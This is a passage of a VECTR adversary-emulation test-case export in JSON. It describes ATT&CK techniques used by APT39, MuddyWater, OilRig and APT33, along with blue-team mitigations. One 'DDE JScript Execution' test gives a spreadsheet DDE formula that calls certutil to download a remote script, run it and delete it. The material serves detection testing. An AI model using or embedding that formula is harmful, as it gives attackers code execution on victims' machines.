a2b-e23c-4acf-a6a3-5ed9dae8d590","intrusion-set--fbd29c89-18ba-4c2d-b792-51c0adee049f"]}],"references":["(Citation: Github PowerShell Empire)","Ackerman, G., et al. (2018, December 21). OVERRULED: Containing a Potentially Destructive Adversary. Retrieved January 17, 2019. https://www.fireeye.com/blog/threat-research/2018/12/overruled-containing-a-potentially-destructive-adversary.html","Goodin, D. (2017, March 17). Virtual machine escape fetches $105,000 at Pwn2Own hacking contest - updated. Retrieved March 12, 2018. https://arstechnica.com/information-technology/2017/03/hack-that-escapes-vm-by-exploiting-edge-browser-fetches-105000-at-pwn2own/","Nettitude. (2018, July 23). Python Server for PoshC2. Retrieved April 23, 2019. https://github.com/nettitude/PoshC2_Python","Nunez, N. (2017, August 9). Moving Beyond EMET II – Windows Defender Exploit Guard. Retrieved March 12, 2018. https://blogs.technet.microsoft.com/srd/2017/08/09/moving-beyond-emet-ii-windows-defender-exploit-guard/","Schroeder, W., Warner, J., Nelson, M. (n.d.). Github PowerShellEmpire. Retrieved April 28, 2016. https://github.com/PowerShellEmpire/Empire","Stepanic, D. (2018, September 2). attck_empire: Generate ATT&CK Navigator layer file from PowerShell Empire agent logs. Retrieved March 11, 2019. https://github.com/dstepanic/attck_empire","The Australian Cyber Security Centre (ACSC), the Canadian Centre for Cyber Security (CCCS), the New Zealand National Cyber Security Centre (NZ NCSC), CERT New Zealand, the UK National Cyber Security Centre (UK NCSC) and the US National Cybersecurity and Communications Integration Center (NCCIC). (2018, October 11). Joint report on publicly available hacking tools. Retrieved March 11, 2019. https://s3.eu-west-1.amazonaws.com/ncsc-content/files/Joint%20report%20on%20publicly%20available%20hacking%20tools%20%28NCSC%29.pdf","Wikipedia. (2018, January 11). Control-flow integrity. Retrieved March 12, 2018. https://en.wikipedia.org/wiki/Control-flow_integrity"],"mitreId":"T1068"},"blueTeam":{"successfulDetectionBehaviors":["Update software regularly by employing patch management for internal enterprise endpoints and servers. Develop a robust cyber threat intelligence capability to determine what types and levels of threat may use software exploits and 0-days against a particular organization. Make it difficult for adversaries to advance their operation through exploitation of undiscovered or unpatched vulnerabilities by using sandboxing, if available. Other types of virtualization and application microsegmentation may also mitigate the impact of some types of client-side exploitation. The risks of additional exploits and weaknesses in implementation may still exist. (Citation: Ars Technica Pwn2Own 2017 VM Escape)\n\nSecurity applications that look for behavior used during exploitation such as Windows Defender Exploit Guard (WDEG) and the Enhanced Mitigation Experience Toolkit (EMET) can be used to mitigate some exploitation behavior. (Citation: TechNet Moving Beyond EMET) Control flow integrity checking is another way to potentially identify and stop a software exploit from occurring. (Citation: Wikipedia Control Flow Integrity) Many of these protections depend on the architecture and target application binary for compatibility and may not work for software components targeted for privilege escalation.","A threat intelligence program helps an organization generate their own threat intelligence information and track trends to inform defensive priorities to mitigate risk.","Perform regular software updates to mitigate exploitation risk.","Use capabilities to detect and block conditions that may lead to or be indicative of a software exploit occurring.","Restrict execution of code to a virtual environment on or in transit to an endpoint system."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--a049d416-50e4-4e3f-8b0e-0762351ad886","vectrId":"a049d416-50e4-4e3f-8b0e-0762351ad886","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"769c1759-3db5-486d-918a-67fbadee4787","templateId":"a049d416-50e4-4e3f-8b0e-0762351ad886","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Spearphishing Attachment","variant":"APT39 - Spearphishing Attachment","objective":"Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.","command":"[APT39](https://attack.mitre.org/groups/G0087) leveraged spearphishing emails with malicious attachments to initially compromise victims.Block unknown or unused attachments by default that should not be transmitted over email as a best practice to prevent some vectors, such as .scr, .exe, .pif, .cpl, etc. Some email scanning devices can open and analyze compressed and encrypted formats, such as zip and rar that may be used to conceal malicious attachments in [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).\n---\nUsers can be trained to identify social engineering techniques and spearphishing emails.\n---\nAnti-virus can also automatically quarantine suspicious files.\n---\nNetwork intrusion prevention systems and systems designed to scan and remove malicious email attachments can be used to block activity.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--6aac77c4-eaf2-4366-8c13-ce50ab951f38","relationship--f60a3a4e-ba53-47ba-8e31-e301f3983f6e","relationship--87b35c42-a798-461b-a58e-2e2d9ea45354","course-of-action--21da4fd4-27ad-4e9c-b93d-0b9b14d02c96","relationship--116249f4-b71c-409e-ad9d-7d59d1297d69","course-of-action--8f6b5ca6-263a-4ea9-98f3-afd2a3cd8119","relationship--ce68b332-ac44-472e-81b9-6cffe7ff11a2","course-of-action--2a4f6c11-a4a7-4cb9-b0ef-6ae1bb3a718a","relationship--0bb376d8-f73c-404f-a1bc-9a89c6b7a435","course-of-action--a6a47a06-08fc-4ec4-bdc3-20373375ebb9","relationship--2efc4972-6779-4a5c-a18a-db3c64623b8c","course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c","intrusion-set--44e43fad-ffcb-4210-abcf-eaaed9735f80"]}],"references":["Hawley et al. (2019, January 29). APT39: An Iranian Cyber Espionage Group Focused on Personal Information. Retrieved February 19, 2019. https://www.fireeye.com/blog/threat-research/2019/01/apt39-iranian-cyber-espionage-group-focused-on-personal-information.html"],"mitreId":"T1193"},"blueTeam":{"successfulDetectionBehaviors":["Restrict use of certain websites, block downloads/attachments, block Javascript, restrict browser extensions, etc.","Network intrusion prevention systems and systems designed to scan and remove malicious email attachments can be used to block activity. Solutions can be signature and behavior based, but adversaries may construct attachments in a way to avoid these systems.\n\nBlock unknown or unused attachments by default that should not be transmitted over email as a best practice to prevent some vectors, such as .scr, .exe, .pif, .cpl, etc. Some email scanning devices can open and analyze compressed and encrypted formats, such as zip and rar that may be used to conceal malicious attachments in [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).\n\nBecause this technique involves user interaction on the endpoint, it's difficult to fully mitigate. However, there are potential mitigations. Users can be trained to identify social engineering techniques and spearphishing emails. To prevent the attachments from executing, application whitelisting can be used. Anti-virus can also automatically quarantine suspicious files.","Train users to to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.","Use signatures or heuristics to detect malicious software.","Use intrusion detection signatures to block traffic at network boundaries."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--a0ff239f-7e96-4a30-83f1-7e8ff93d2dbe","vectrId":"a0ff239f-7e96-4a30-83f1-7e8ff93d2dbe","name":null,"offset":0,"createTime":1.574779748235E12,"updateTime":1.574779748235E12,"phaseId":"772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","templateId":"a0ff239f-7e96-4a30-83f1-7e8ff93d2dbe","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Command-Line Interface","variant":"MuddyWater - Command-Line Interface","objective":"Command-line interfaces provide a way of interacting with computer systems and is a common feature across many types of operating system platforms. (Citation: Wikipedia Command-Line Interface) One example command-line interface on Windows systems is [cmd](https://attack.mitre.org/software/S0106), which can be used to perform a number of tasks including execution of other software. Command-line interfaces can be interacted with locally or remotely via a remote desktop application, reverse shell session, etc. Commands that are executed run with the current permission level of the command-line interface process unless the command includes process invocation that changes permissions context for that execution (e.g. [Scheduled Task](https://attack.mitre.org/techniques/T1053)).\n\nAdversaries may use command-line interfaces to interact with systems and execute other software during the course of an operation.","command":"[MuddyWater](https://attack.mitre.org/groups/G0069) has used a custom tool for creating reverse shells.Audit and/or block unnecessary command-line interpreters by using application whitelisting tools, like Windows Defender Application Control, AppLocker, or Software Restriction Policies where appropriate.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830","relationship--3ab6b7bc-bb49-4fcd-83fc-abbec5912d41","relationship--87fd0088-41da-47ac-bd69-a8ac151a0d39","course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db","relationship--b1ee5cba-d4e0-4af0-aa5c-5faacfdb0dbc","course-of-action--f28a20fd-d173-4603-807e-2cb3f51bdf04","intrusion-set--269e8108-68c6-4f99-b911-14b2e765dec2"]}],"references":["Beechey, J. (2010, December). Application Whitelisting: Panacea or Propaganda?. Retrieved November 18, 2014. http://www.sans.org/reading-room/whitepapers/application/application-whitelisting-panacea-propaganda-33599","Corio, C., & Sayana, D. P. (2008, June). Application Lockdown with Software Restriction Policies. Retrieved November 18, 2014. http://technet.microsoft.com/en-us/magazine/2008.06.srp.aspx","Gorzelany, A., Hall, J., Poggemeyer, L.. (2019, January 7). Windows Defender Application Control. Retrieved July 16, 2019. https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control","Microsoft. (2012, June 27). Using Software Restriction Policies and AppLocker Policies. Retrieved April 7, 2016. https://technet.microsoft.com/en-us/library/ee791851.aspx","NSA Information Assurance Directorate. (2014, August). Application Whitelisting Using Microsoft AppLocker. Retrieved March 31, 2016. https://www.iad.gov/iad/library/ia-guidance/tech-briefs/application-whitelisting-using-microsoft-applocker.cfm","Symantec DeepSight Adversary Intelligence Team. (2018, December 10). Seedworm: Group Compromises Government Agencies, Oil & Gas, NGOs, Telecoms, and IT Firms. Retrieved December 14, 2018. https://www.symantec.com/blogs/threat-intelligence/seedworm-espionage-group","Tomonaga, S. (2016, January 26). Windows Commands Abused by Attackers. Retrieved February 2, 2016. http://blog.jpcert.or.jp/2016/01/windows-commands-abused-by-attackers.html","Wikipedia. (2016, June 26). Command-line interface. Retrieved June 27, 2016. https://en.wikipedia.org/wiki/Command-line_interface"],"mitreId":"T1059"},"blueTeam":{"successfulDetectionBehaviors":["Block execution of code on a system through application whitelisting, blacklisting, and/or script blocking.","Audit and/or block command-line interpreters by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--a273ffd2-52a2-4e58-9648-1086faca3cc6","vectrId":"a273ffd2-52a2-4e58-9648-1086faca3cc6","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"47da3f56-d9fc-4735-a343-b57b4ad8eca5","templateId":"a273ffd2-52a2-4e58-9648-1086faca3cc6","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Valid Accounts","variant":"OilRig - Valid Accounts","objective":"Adversaries may steal the credentials of a specific user or service account using Credential Access techniques or capture credentials earlier in their reconnaissance process through social engineering for means of gaining Initial Access. \n\nAccounts that an adversary may use can fall into three categories: default, local, and domain accounts. Default accounts are those that are built-into an OS such as Guest or Administrator account on Windows systems or default factory/provider set accounts on other types of systems, software, or devices. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. (Citation: Microsoft Local Accounts Feb 2019) Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.\n\nCompromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nDefault accounts are also not limited to Guest and Administrator on client machines, they also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or COTS. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed private keys, or stolen private keys, to legitimately connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021) (Citation: Metasploit SSH Module)\n\nThe overlap of account access, credentials, and permissions across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise. (Citation: TechNet Credential Theft)","command":"[OilRig](https://attack.mitre.org/groups/G0049) has used compromised credentials to access other systems on a victim network.Integrating multi-factor authentication (MFA) as part of organizational policy can greatly reduce the risk of an adversary gaining control of valid credentials that may be used for additional tactics such as initial access, lateral movement, and collecting information. MFA can also be used to restrict access to cloud resources and APIs.\n---\nRoutinely audit source code, application configuration files, open repositories, and public cloud storage for insecure use and storage of credentials.\n---\nCloud service providers support IP-based restrictions when accessing cloud resources. Consider using IP whitelisting on cloud-based systems along with user account management to ensure that data access is restricted not only to valid users but only from expected IP ranges to mitigate the use of stolen credentials to access data.\n---\nAudit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account. These audits should also include if default accounts have been enabled, or if new local accounts are created that have not be authorized. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled and use of accounts is segmented, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers. Limit credential overlap across systems to prevent access if account credentials are obtained.\n---\nEnsure that applications do not store sensitive data or credentials insecurely. (e.g. plaintext credentials in code, published credentials in repositories, or credentials in public cloud storage).\n---\nEnsure users and user groups have appropriate permissions for their roles through Identity and Access Management (IAM) controls. Configure user permissions, groups, and roles for access to cloud-based systems as well. Implement strict IAM controls to prevent access to systems except for the applications, users, and services that require access. Consider using temporary credentials that are only good for a certain period of time in cloud environments to reduce the effectiveness of compromised accounts.\n---\nApplications and appliances that utilize default username and password should be changed immediately after the installation, and before deployment to a production environment. When possible, applications that use SSH keys should be updated periodically and properly secured. Ensure that local administrator accounts have complex, unique passwords across all systems on the network.\n\nIn cloud environments, consider rotating access keys within a certain number of days for reducing the effectiveness of stolen credentials.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81","relationship--9779ccbc-c376-4a6e-a43f-56a782892302","relationship--33e04e78-4d99-49f1-8b10-39b2df7b2419","course-of-action--b045d015-6bed-4490-bd38-56b41ece59a0","relationship--4bc294a7-8b41-481e-8ed0-fa556375cb6b","course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8","relationship--e38d51a7-a4bc-4489-84c6-703f5d174816","course-of-action--20f6a9df-37c4-4e20-9e47-025983b1b39d","relationship--89887815-acfc-42f9-9172-81437cf9ff69","course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f","relationship--c8acdf40-8237-487f-8255-91afa327705d","course-of-action--25dc1ce8-eb55-4333-ae30-a7cb4f5894a1","relationship--3c3f26b3-d676-4e17-adca-2a8ea4643148","course-of-action--d45f03a8-790a-4f90-b956-cd7e5b8886bf","relationship--aa6cd875-0e05-4a6c-a249-27c708d50bf4","course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317","relationship--4f24d075-4d6c-49d2-a213-306e4af2083d","course-of-action--90c218c3-fbf8-4830-98a7-e8cfb7eaa485","intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d"]}],"references":["Davis, S. and Caban, D. (2017, December 19). APT34 - New Targeted Attack in the Middle East. Retrieved December 20, 2017. https://www.brighttalk.com/webcast/10703/296317/apt34-new-targeted-attack-in-the-middle-east","Microsoft. (2016, April 15). Attractive Accounts for Credential Theft. Retrieved June 3, 2016. https://technet.microsoft.com/en-us/library/dn535501.aspx","Microsoft. (2016, April 15). Audit Policy Recommendations. Retrieved June 3, 2016. https://technet.microsoft.com/en-us/library/dn487457.aspx","Microsoft. (2016, April 16). Implementing Least-Privilege Administrative Models. Retrieved June 3, 2016. https://technet.microsoft.com/en-us/library/dn487450.aspx","Microsoft. (2018, December 9). Local Accounts. Retrieved February 11, 2019. https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/local-accounts","Plett, C., Poggemeyer, L. (12, October 26). Securing Privileged Access Reference Material. Retrieved April 25, 2017. https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material#a-nameesaebmaesae-administrative-forest-design-approach","Unit 42. (2017, December 15). Unit 42 Playbook Viewer. Retrieved December 20, 2017. https://pan-unit42.github.io/playbook_viewer/","undefined. (n.d.). Retrieved April 12, 2019. https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits/linux/ssh","undefined. (n.d.). Risks of Default Passwords on the Internet. Retrieved April 12, 2019. https://www.us-cert.gov/ncas/alerts/TA13-175A"],"mitreId":"T1078"},"blueTeam":{"successfulDetectionBehaviors":["Use two or more pieces of evidence to authenticate to a system; such as username and password in addition to a token from a physical smart card or token generator.","Perform audits or scans of systems, permissions, insecure software, insecure configurations, etc. to identify potential weaknesses.","Use network appliances to filter ingress or egress traffic and perform protocol-based filtering. Configure software on endpoints to filter network traffic.","Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.","This mitigation describes any guidance or training given to developers of applications to avoid introducing security weaknesses that an adversary may be able to take advantage of.","Take measures to detect or prevent techniques such as [Credential Dumping](https://attack.mitre.org/techniques/T1003) or installation of keyloggers to acquire credentials through [Input Capture](https://attack.mitre.org/techniques/T1056). Limit credential overlap across systems to prevent access if account credentials are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled and use of accounts is segmented, as this is often equivalent to having a local administrator account with the same password on all systems. \n\nFollow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers. (Citation: Microsoft Securing Privileged Access) \n\nAudit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account. (Citation: TechNet Credential Theft) (Citation: TechNet Least Privilege) These audits should also include if default accounts have been enabled, or if new local accounts are created that have not be authorized. \n\nApplications and appliances that utilize default username and password should be changed immediately after the installation, and before deployment to a production environment. (Citation: US-CERT Alert TA13-175A Risks of Default Passwords on the Internet) When possible, applications that use SSH keys should be updated periodically and properly secured. ","Manage the creation, modification, use, and permissions associated to user accounts.","Set and enforce secure password policies for accounts."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--a4a28e1c-dce4-4446-a034-6d519d090c84","vectrId":"a4a28e1c-dce4-4446-a034-6d519d090c84","name":null,"offset":0,"createTime":1.574779748235E12,"updateTime":1.574779748235E12,"phaseId":"769c1759-3db5-486d-918a-67fbadee4787","templateId":"a4a28e1c-dce4-4446-a034-6d519d090c84","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Spearphishing Attachment","variant":"MuddyWater - Spearphishing Attachment","objective":"Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.","command":"[MuddyWater](https://attack.mitre.org/groups/G0069) has compromised third parties and used compromised accounts to send spearphishing emails with targeted attachments to recipients.Block unknown or unused attachments by default that should not be transmitted over email as a best practice to prevent some vectors, such as .scr, .exe, .pif, .cpl, etc. Some email scanning devices can open and analyze compressed and encrypted formats, such as zip and rar that may be used to conceal malicious attachments in [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).\n---\nUsers can be trained to identify social engineering techniques and spearphishing emails.\n---\nAnti-virus can also automatically quarantine suspicious files.\n---\nNetwork intrusion prevention systems and systems designed to scan and remove malicious email attachments can be used to block activity.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--6aac77c4-eaf2-4366-8c13-ce50ab951f38","relationship--2305a634-b226-4da2-a766-bec5458f9447","relationship--87b35c42-a798-461b-a58e-2e2d9ea45354","course-of-action--21da4fd4-27ad-4e9c-b93d-0b9b14d02c96","relationship--116249f4-b71c-409e-ad9d-7d59d1297d69","course-of-action--8f6b5ca6-263a-4ea9-98f3-afd2a3cd8119","relationship--ce68b332-ac44-472e-81b9-6cffe7ff11a2","course-of-action--2a4f6c11-a4a7-4cb9-b0ef-6ae1bb3a718a","relationship--0bb376d8-f73c-404f-a1bc-9a89c6b7a435","course-of-action--a6a47a06-08fc-4ec4-bdc3-20373375ebb9","relationship--2efc4972-6779-4a5c-a18a-db3c64623b8c","course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c","intrusion-set--269e8108-68c6-4f99-b911-14b2e765dec2"]}],"references":["Kaspersky Lab's Global Research & Analysis Team. (2018, October 10). MuddyWater expands operations. Retrieved November 2, 2018. https://securelist.com/muddywater/88059/","Lancaster, T.. (2017, November 14). Muddying the Water: Targeted Attacks in the Middle East. Retrieved March 15, 2018. https://researchcenter.paloaltonetworks.com/2017/11/unit42-muddying-the-water-targeted-attacks-in-the-middle-east/","Singh, S. et al.. (2018, March 13). Iranian Threat Group Updates Tactics, Techniques and Procedures in Spear Phishing Campaign. Retrieved April 11, 2018. https://www.fireeye.com/blog/threat-research/2018/03/iranian-threat-group-updates-ttps-in-spear-phishing-campaign.html"],"mitreId":"T1193"},"blueTeam":{"successfulDetectionBehaviors":["Restrict use of certain websites, block downloads/attachments, block Javascript, restrict browser extensions, etc.","Network intrusion prevention systems and systems designed to scan and remove malicious email attachments can be used to block activity. Solutions can be signature and behavior based, but adversaries may construct attachments in a way to avoid these systems.\n\nBlock unknown or unused attachments by default that should not be transmitted over email as a best practice to prevent some vectors, such as .scr, .exe, .pif, .cpl, etc. Some email scanning devices can open and analyze compressed and encrypted formats, such as zip and rar that may be used to conceal malicious attachments in [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).\n\nBecause this technique involves user interaction on the endpoint, it's difficult to fully mitigate. However, there are potential mitigations. Users can be trained to identify social engineering techniques and spearphishing emails. To prevent the attachments from executing, application whitelisting can be used. Anti-virus can also automatically quarantine suspicious files.","Train users to to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.","Use signatures or heuristics to detect malicious software.","Use intrusion detection signatures to block traffic at network boundaries."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--a4b954c8-e087-42c1-bd94-0957be7d4859","vectrId":"a4b954c8-e087-42c1-bd94-0957be7d4859","name":"","offset":0,"createTime":1.578424809757E12,"updateTime":1.57842574511E12,"phaseId":"772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","templateId":"a4b954c8-e087-42c1-bd94-0957be7d4859","icon":"icons/microsoft-word.svg","redTeam":{"trueAttackStartTimelineId":"","trueAttackEndTimelineId":"","status":"NotPerformed","method":"Dynamic Data Exchange","variant":"DDE JScript Execution","objective":"Execute malicious Office document on the endpoint that utilizes DDE to launch a JScript payload","command":"=cmd|'/c certutil https://<jscript file url> <local file location> && <local file location> && del <local file location>'!A1","likelihood":"Low","risk":"Low","internalExternal":"Internal","stealth":"Low","attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["9d8e81e7-127f-464e-8671-bfdc6cced3d5","4134a48a-87f8-6a59-c5f0-e238c3c8615e"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[],"references":[],"mitreId":"T1204"},"blueTeam":{"successfulDetectionBehaviors":["1) DDE execution is blocked by GPO policy, EDR or endpoint protection tool"],"expectedDetectionLayerIds":["9309d503-0861-4923-8a9a-f4749113e9e7","765c22af-e010-4b4d-9ba5-86e1ae6c916d","860cc9bc-4da2-4698-889b-e96cca9e4bf3"],"blueTeamProductIds":[],"outcomeNotes":"","trueDetectionTimelineId":"","alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":["1) Document payload execution is detected by EDR or endpoint protection tool"]},"evidenceFiles":[],"organizationIds":["1cf413ba-326a-4d18-979c-367eb1306f69"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--a62bfd0f-27b2-4842-8f1f-4725eb4fb6bb","vectrId":"a62bfd0f-27b2-4842-8f1f-4725eb4fb6bb","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","templateId":"a62bfd0f-27b2-4842-8f1f-4725eb4fb6bb","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"User Execution","variant":"APT33 - User Execution","objective":"An adversary may rely upon specific actions by a user in order to gain execution. This may be direct code execution, such as when a user opens a malicious executable delivered via [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) with the icon and apparent extension of a document file. It also may lead to other execution techniques, such as when a user clicks on a link delivered via [Spearphishing Link](https://attack.mitre.org/techniques/T1192) that leads to exploitation of a browser or application vulnerability via [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl. 